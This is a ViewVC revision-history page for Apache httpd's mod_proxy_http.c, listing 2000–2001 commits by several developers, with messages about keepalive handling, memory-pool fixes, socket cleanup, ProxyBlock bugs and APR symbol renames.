*Tue Apr 10 09:30:12 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88779)

File length: 26037 byte(s)

Diff to [previous 88778](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88778&r2=88779)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88778&r2=88779&diff_format=h))
```
Memory allocation cleanups
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88778**](/viewvc?view=revision&revision=88778) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88778&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88778&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88778))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88778)

Modified
*Tue Apr 10 00:45:02 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88778)

File length: 25195 byte(s)

Diff to [previous 88769](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88769&r2=88778)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88769&r2=88778&diff_format=h))
```
Change HTTP proxy to use ap_proxy_string_read() instead of apr_brigade_read()
to make sure all the buckets are read...
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88769**](/viewvc?view=revision&revision=88769) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88769&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88769&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88769))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88769)

Modified
*Sun Apr 8 16:29:30 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88769)

File length: 25702 byte(s)

Diff to [previous 88765](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88765&r2=88769)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88765&r2=88769&diff_format=h))
```
HTTP_VERSION() is the correct way to do this...
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88765**](/viewvc?view=revision&revision=88765) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88765&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88765&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88765))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88765)

Modified
*Sun Apr 8 09:49:49 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88765)

File length: 25693 byte(s)

Diff to [previous 88754](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88754&r2=88765)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88754&r2=88765&diff_format=h))
```
Add #defines for protocol version checks...
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88754**](/viewvc?view=revision&revision=88754) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88754&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88754&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88754))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88754)

Modified
*Sat Apr 7 19:41:03 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88754)

File length: 25689 byte(s)

Diff to [previous 88751](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88751&r2=88754)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88751&r2=88754&diff_format=h))
```
Downstream keepalives in mod_proxy should not kick in if the upstream
client is < HTTP/1.1
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88751**](/viewvc?view=revision&revision=88751) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88751&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88751&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88751))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88751)

Modified
*Sat Apr 7 14:06:13 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88751)

File length: 25664 byte(s)

Diff to [previous 88746](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88746&r2=88751)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88746&r2=88751&diff_format=h))
```
Sockets weren't being closed if the proxy could not connect to
a remote machine...
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88746**](/viewvc?view=revision&revision=88746) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88746&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88746&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88746))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88746)

Modified
*Sat Apr 7 12:24:38 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88746)

File length: 25635 byte(s)

Diff to [previous 88740](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88740&r2=88746)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88740&r2=88746&diff_format=h))
```
Fixed problem where the port was left at zero on requests instead of
being set to the default scheme port 80
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88740**](/viewvc?view=revision&revision=88740) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88740&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88740&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88740))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88740)

Modified
*Fri Apr 6 14:25:54 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88740)

File length: 25556 byte(s)

Diff to [previous 88739](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88739&r2=88740)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88739&r2=88740&diff_format=h))
```
Bugfixes to proxy_ftp.c -> in some places uri_addr was used instead
of connect_addr - all hail cut and paste!
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**88739**](/viewvc?view=revision&revision=88739) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88739&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88739&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88739))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88739)

Modified
*Fri Apr 6 10:44:08 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88739)

File length: 25948 byte(s)

Diff to [previous 88737](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88737&r2=88739)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88737&r2=88739&diff_format=h))
```
Converted send_dir() to ap_proxy_send_dir_filter() in proxy_ftp.c.
Fixed up the header files
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**88737**](/viewvc?view=revision&revision=88737) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88737&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88737&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88737))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88737)

Modified
*Fri Apr 6 01:59:26 2001 UTC*
(23 years, 9 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88737)

File length: 26188 byte(s)

Diff to [previous 88732](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88732&r2=88737)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88732&r2=88737&diff_format=h))
```
More pool allocation errors. The apr_sockaddr_t structures connect_addr and
uri_addr were getting allocated out of the wrong pool (one of the request pools)
when they were expected to stick around for the life of the socket.
Further, the default pool to be used should have been the connection pool in the
request_rec.

```

---

Revision [**88732**](/viewvc?view=revision&revision=88732) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88732&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88732&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88732))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88732)

Modified
*Thu Apr 5 18:53:04 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88732)

File length: 26128 byte(s)

Diff to [previous 88730](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88730&r2=88732)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88730&r2=88732&diff_format=h))
```
Cleanup of dead functions within proxy_util.c.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88730**](/viewvc?view=revision&revision=88730) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88730&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88730&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88730))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88730)

Modified
*Thu Apr 5 18:25:04 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88730)

File length: 26249 byte(s)

Diff to [previous 88721](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88721&r2=88730)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88721&r2=88730&diff_format=h))
```
Reworked the storage of the client socket between keepalive connections
to fix some nasty problems with the socket lasting longer than the
memory pool it was allocated from.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88721**](/viewvc?view=revision&revision=88721) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88721&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88721&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88721))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88721)

Modified
*Wed Apr 4 18:47:42 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88721)

File length: 25893 byte(s)

Diff to [previous 88659](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88659&r2=88721)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88659&r2=88721&diff_format=h))
```
Some code rewriting in ap_proxy_connect_handler():
*) Fixed bug where a hostname without a "." in it (such as "localhost")
would not trigger an IP address check with ProxyBlock.
*) Fixed ProxyBlock bugs with ap_proxy_http_handler() and
ap_proxy_connect_handler().
*) Updated ap_proxy_connect_handler() to support APR, while
moving some common code between http_handler and connect_handler
to proxy_util.c.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88659**](/viewvc?view=revision&revision=88659) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88659&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88659&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88659))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88659)

Modified
*Mon Apr 2 21:19:22 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88659)

File length: 26730 byte(s)

Diff to [previous 88657](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88657&r2=88659)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88657&r2=88659&diff_format=h))
```
Fixing a few compiler warnings with mod_proxy
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88657**](/viewvc?view=revision&revision=88657) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88657&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88657&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88657))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88657)

Modified
*Mon Apr 2 20:55:23 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88657)

File length: 26764 byte(s)

Diff to [previous 88648](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88648&r2=88657)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88648&r2=88657&diff_format=h))
```
Fixed problem where responses without entity bodies would cause
the directly following proxy keepalive request to fail.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88648**](/viewvc?view=revision&revision=88648) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88648&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88648&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88648))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88648)

Modified
*Mon Apr 2 17:04:19 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88648)

File length: 26629 byte(s)

Diff to [previous 88579](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88579&r2=88648)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88579&r2=88648&diff_format=h))
```
  *) Added support for downstream keepalives in mod_proxy.
  *) Changed mod_proxy ap_proxy_http_handler() to support APR properly.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88579**](/viewvc?view=revision&revision=88579) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88579&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88579&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88579))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88579)

Modified
*Sun Mar 25 20:23:25 2001 UTC*
(23 years, 10 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88579)

File length: 20498 byte(s)

Diff to [previous 88534](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88534&r2=88579)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88534&r2=88579&diff_format=h))
```
Header Bugfix / General Cleanups in ap_proxy_http_handler / X-Forwarded-* headers
PR:
Obtained from:
Reviewed by:	Chuck Murcko

```

---

Revision [**88534**](/viewvc?view=revision&revision=88534) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88534&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88534&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88534))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88534)

Modified
*Mon Mar 19 08:54:41 2001 UTC*
(23 years, 10 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88534)

File length: 18670 byte(s)

Diff to [previous 88518](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88518&r2=88534)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88518&r2=88534&diff_format=h))
```
reorganize STATUS; update copyright

```

---

Revision [**88518**](/viewvc?view=revision&revision=88518) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88518&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88518&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88518))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88518)

Modified
*Wed Mar 14 21:16:41 2001 UTC*
(23 years, 10 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88518)

File length: 18665 byte(s)

Diff to [previous 88487](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88487&r2=88518)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88487&r2=88518&diff_format=h))
```
Pull in the Connection handling part of the v1.3 patch for HTTP/1.1.
Some preliminary HTTP/1.1 work
Some comments and fixes
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88487**](/viewvc?view=revision&revision=88487) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88487&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88487&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88487))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88487)

Modified
*Sun Mar 11 10:42:14 2001 UTC*
(23 years, 10 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88487)

File length: 16680 byte(s)

Diff to [previous 88077](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88077&r2=88487)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88077&r2=88487&diff_format=h))
```
Cache removed, with other spooge
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**88077**](/viewvc?view=revision&revision=88077) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88077&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88077&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88077))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88077)

Modified
*Sun Feb 11 00:12:43 2001 UTC*
(23 years, 11 months ago)
by *rbb*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88077)

File length: 17949 byte(s)

Diff to [previous 88019](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88019&r2=88077)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88019&r2=88077&diff_format=h))
```
Fix any compile breaks after moving apr_snprintf and apr_vsnprintf to
apr_strings.h

```

---

Revision [**88019**](/viewvc?view=revision&revision=88019) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88019&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88019&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88019))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88019)

Modified
*Thu Feb 8 07:45:33 2001 UTC*
(23 years, 11 months ago)
by *dougm*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88019)

File length: 17924 byte(s)

Diff to [previous 88004](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88004&r2=88019)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88004&r2=88019&diff_format=h))
```
renaming various functions for consistency sake
see: <http://apr.apache.org/~dougm/apr_rename.pl>
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**88004**](/viewvc?view=revision&revision=88004) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88004&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88004&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88004))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88004)

Modified
*Wed Feb 7 05:41:35 2001 UTC*
(23 years, 11 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88004)

File length: 17914 byte(s)

Diff to [previous 87982](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87982&r2=88004)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87982&r2=88004&diff_format=h))
```
Changes to get running on the current codebase
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**87982**](/viewvc?view=revision&revision=87982) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87982&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87982&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=87982))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=87982)

Modified
*Mon Feb 5 15:04:32 2001 UTC*
(23 years, 11 months ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=87982)

File length: 17841 byte(s)

Diff to [previous 87731](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87731&r2=87982)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87731&r2=87982&diff_format=h))
```
ap_new_connection() returns NULL if an error occurred (prefork MPM
and ap_new_connection() were changed last week)

I have skipped putting the change into WinNT MPM and mod_proxy.  I
left a note in the mod_proxy code; for the NT MPM I think I can talk
somebody into doing the right thing for me.

```

---

Revision [**87731**](/viewvc?view=revision&revision=87731) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87731&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87731&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=87731))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=87731)

Modified
*Fri Jan 19 07:04:36 2001 UTC*
(24 years ago)
by *wrowe*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=87731)

File length: 17637 byte(s)

Diff to [previous 87181](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87181&r2=87731)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87181&r2=87731&diff_format=h))
```

  The big change.  This is part 3 of the apr-util symbols rename, please
  see the first commit of srclib/apr-util/include (cvs apr-util/include)
  for the quick glance at symbols changed.

```

---

Revision [**87181**](/viewvc?view=revision&revision=87181) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87181&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87181&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=87181))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=87181)

Modified
*Mon Dec 4 19:24:10 2000 UTC*
(24 years, 1 month ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=87181)

File length: 17605 byte(s)

Diff to [previous 87025](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87025&r2=87181)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=87025&r2=87181&diff_format=h))
```
Get rid of ap_new_apr_connection().  ap_new_connection() now has
fewer parameters: the local and remote socket addresses were removed
from the parameter list because all required information is available
via the APR socket.

I haven't tested the most important part -- the WinNT MPM changes
-- but it compiles and it looks okay :)  If the WinNT MPM works on
Win98 these days let me know.

```

---

Revision [**87025**](/viewvc?view=revision&revision=87025) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87025&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=87025&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=87025))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=87025)

Modified
*Sun Nov 19 14:27:45 2000 UTC*
(24 years, 2 months ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=87025)

File length: 17609 byte(s)

